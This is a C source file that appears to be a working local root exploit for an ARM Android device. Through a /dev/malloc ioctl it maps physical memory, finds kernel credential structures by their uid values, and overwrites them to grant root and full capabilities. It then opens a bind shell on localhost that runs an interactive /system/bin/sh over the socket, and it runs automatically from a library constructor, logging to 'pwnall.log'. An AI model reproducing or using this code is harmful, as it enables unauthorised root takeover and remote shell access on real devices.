typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_close 6
#define SYS_write 4
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_getuid 199
#define SYS_socket 281
#define SYS_bind 282
#define SYS_listen 284
#define SYS_accept 285
#define SYS_dup2 63
#define SYS_execve 11
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 asm("r7")=n;register long r0 asm("r0")=a;register long r1 asm("r1")=b;register long r2 asm("r2")=c;register long r3 asm("r3")=d;register long r4 asm("r4")=e;register long r5 asm("r5")=f;asm volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void put(const char*s){sc(SYS_write,1,(long)s,slen(s),0,0,0);}
static void wf(int fd,const char*s){sc(SYS_write,fd,(long)s,slen(s),0,0,0);}
static void hx(int fd,u64 v){char b[17];int i;for(i=15;i>=0;i--){int d=v&0xf;b[i]=d<10?'0'+d:'a'+d-10;v>>=4;}b[16]=0;wf(fd,b);}
static void dc(int fd,long v){char b[32];int i=31;b[31]=0;if(v<0){wf(fd,"-");v=-v;}if(!v){wf(fd,"0");return;}while(v&&i){b[--i]='0'+v%10;v/=10;}wf(fd,b+i);}
struct info { u64 addr; u64 size; u64 interval; u8 miusel; u8 pad[7]; };
static int pfd;
static unsigned long mp(u64 phys,u64 size){struct info i;i.addr=phys-0x20000000ULL;i.size=size;i.interval=0;i.miusel=0;for(int k=0;k<7;k++)i.pad[k]=0;long r=sc(SYS_ioctl,pfd,0x80204d04,(long)&i,0,0,0);if(r<0)return 0;long p=sc(SYS_mmap2,0,(long)size,3,1,pfd,0);if((unsigned long)p>=0xfffff000UL)return 0;return (unsigned long)p;}
static void server(void){
 put("SERVER uid=");{char b[16];int i=15;long v=sc(SYS_getuid,0,0,0,0,0,0);b[15]=0;if(!v)b[--i]='0';while(v&&i){b[--i]='0'+v%10;v/=10;}sc(SYS_write,1,(long)(b+i),15-i,0,0,0);}put("\n");
 int s=sc(SYS_socket,2,1,0,0,0,0);put("sock=");{char b[16];int i=15;long v=s;b[15]=0;if(!v)b[--i]='0';if(v<0){b[--i]='-';v=-v;}while(v&&i){b[--i]='0'+v%10;v/=10;}sc(SYS_write,1,(long)(b+i),15-i,0,0,0);}put("\n");if(s<0)return;
 struct sockaddr_in { unsigned short f; unsigned short p; unsigned int a; unsigned char z[8]; }; struct sockaddr_in a; unsigned char*ap=(unsigned char*)&a;for(int i=0;i<16;i++)ap[i]=0;a.f=2;a.p=0x5d11;a.a=0x0100007f;
 long r=sc(SYS_bind,s,(long)&a,16,0,0,0);put("bind=");{char b[16];int i=15;b[15]=0;long v=r;if(!v)b[--i]='0';if(v<0){b[--i]='-';v=-v;}while(v&&i){b[--i]='0'+v%10;v/=10;}sc(SYS_write,1,(long)(b+i),15-i,0,0,0);}put("\n");
 if(r<0)return;sc(SYS_listen,s,1,0,0,0,0);int c=sc(SYS_accept,s,0,0,0,0,0);put("accept=");{char b[16];int i=15;b[15]=0;long v=c;if(!v)b[--i]='0';if(v<0){b[--i]='-';v=-v;}while(v&&i){b[--i]='0'+v%10;v/=10;}sc(SYS_write,1,(long)(b+i),15-i,0,0,0);}put("\n");if(c<0)return;
 sc(SYS_dup2,c,0,0,0,0,0);sc(SYS_dup2,c,1,0,0,0,0);sc(SYS_dup2,c,2,0,0,0,0);
 char*argv[3];argv[0]=(char*)"/system/bin/sh";argv[1]=(char*)"-i";argv[2]=0;char*envp[4];envp[0]=(char*)"PATH=/sbin:/system/sbin:/system/bin:/system/xbin";envp[1]=(char*)"HOME=/";envp[2]=(char*)"TERM=xterm";envp[3]=0;
 sc(SYS_execve,(long)"/system/bin/sh",(long)argv,(long)envp,0,0,0);
}
static void scan_patch(int lf){
 for(u64 phys=0x20000000ULL; phys<0x60000000ULL; phys+=0x1000000ULL){
   unsigned long p=mp(phys,0x1000000); if(!p){wf(lf,"NOMAP\n");continue;}
   u8*b=(u8*)p;
   for(int pg=0;pg<0x1000000;pg+=0x1000){
     for(int uoff=4;uoff<0xf00;uoff+=4){
       u32*q=(u32*)(b+pg+uoff); int ok=1;
       for(int k=0;k<8;k++) if(q[k]!=1000){ok=0;break;}
       if(!ok) continue;
       u64 C=phys+pg+uoff-4;
       wf(lf,"try ");hx(lf,C);wf(lf,"\n");
       static u8 save[0x1000]; for(int k=0;k<0x1000;k++) save[k]=b[pg+k];
       for(int k=0;k<8;k++) *(u32*)(b+pg+uoff+k*4)=0;
       *(u32*)(b+pg+uoff+0x20)=0;
       for(int k=0x24;k<0x4c;k+=4) *(u32*)(b+pg+uoff+k)=0xffffffffu;
       long u=sc(SYS_getuid,0,0,0,0,0,0);
       wf(lf," uid=");dc(lf,u);wf(lf,"\n");
       if(u==0){wf(lf,"ROOT\n");sc(SYS_munmap,p,0x1000000,0,0,0,0);server();return;}
       for(int k=0;k<0x1000;k++) b[pg+k]=save[k];
     }
   }
   sc(SYS_munmap,p,0x1000000,0,0,0,0);
 }
 wf(lf,"NONE\n");
}
__attribute__((constructor)) static void ctor(void){
 int lf=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/pwnall.log",0x241,0666,0,0,0);if(lf<0)return;wf(lf,"M0\n");
 pfd=sc(SYS_open,(long)"/dev/malloc",0x42,0666,0,0,0);wf(lf,"fd=");dc(lf,pfd);wf(lf,"\n");if(pfd<0)return;
 scan_patch(lf);
 sc(SYS_close,lf,0,0,0,0,0);
}
